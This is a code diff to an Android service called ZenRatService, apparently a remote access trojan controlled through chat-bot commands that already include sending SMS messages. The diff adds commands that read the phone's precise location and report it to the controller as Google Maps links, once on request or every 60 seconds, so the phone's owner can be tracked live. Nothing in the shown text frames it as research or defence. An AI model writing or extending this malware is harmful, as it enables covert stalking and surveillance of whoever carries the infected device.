@@ -6,10 +6,19 @@ import android.annotation.SuppressLint
 import android.net.Uri
 import android.os.IBinder
 import android.provider.Settings
+import android.Manifest
+import android.content.pm.PackageManager
+import android.location.Location
 import android.provider.Telephony
 import android.telephony.SmsManager
 import android.util.Log
+import androidx.core.content.ContextCompat
+import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
+import com.google.android.gms.tasks.CancellationTokenSource
 import io.ktor.client.*
+import kotlinx.coroutines.*
+import kotlinx.coroutines.tasks.await
 import io.ktor.client.call.*
 import io.ktor.client.engine.cio.*
 import io.ktor.client.plugins.contentnegotiation.*
@@ -22,6 +31,7 @@ class ZenRatService : Service() {
 
     private val job = Job()
     private val scope = CoroutineScope(Dispatchers.IO + job)
+    private var locationUpdateJob: Job? = null
 
     private val client by lazy {
         HttpClient(CIO) {
@@ -129,6 +139,54 @@ class ZenRatService : Service() {
                     sendMessage(message.chat.id, "Invalid format. Use: /sendsms <phoneNumber> <message>")
                 }
             }
+            "/getlocation" -> {
+                val location = getCurrentLocation()
+                if (location != null) {
+                    val mapsLink = "https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}"
+                    sendMessage(message.chat.id, "Last known location: $mapsLink")
+                } else {
+                    sendMessage(message.chat.id, "Could not retrieve location. Have you granted location permissions?")
+                }
+            }
+            "/startlocationupdates" -> {
+                startLocationUpdates(message.chat.id)
+            }
+            "/stoplocationupdates" -> {
+                stopLocationUpdates()
+                sendMessage(message.chat.id, "Location updates stopped.")
+            }
+        }
+    }
+
+    private fun startLocationUpdates(chatId: Long) {
+        locationUpdateJob?.cancel() // Cancel any existing job
+        locationUpdateJob = scope.launch {
+            sendMessage(chatId, "Starting location updates every 60 seconds...")
+            while (isActive) {
+                val location = getCurrentLocation()
+                if (location != null) {
+                    val mapsLink = "https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}"
+                    sendMessage(chatId, "Live Location: $mapsLink")
+                }
+                delay(60000) // 60 seconds
+            }
+        }
+    }
+
+    private fun stopLocationUpdates() {
+        locationUpdateJob?.cancel()
+    }
+
+    private suspend fun getCurrentLocation(): Location? {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            return null
+        }
+        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        return try {
+            fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, CancellationTokenSource().token).await()
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting location", e)
+            null
         }
     }
 
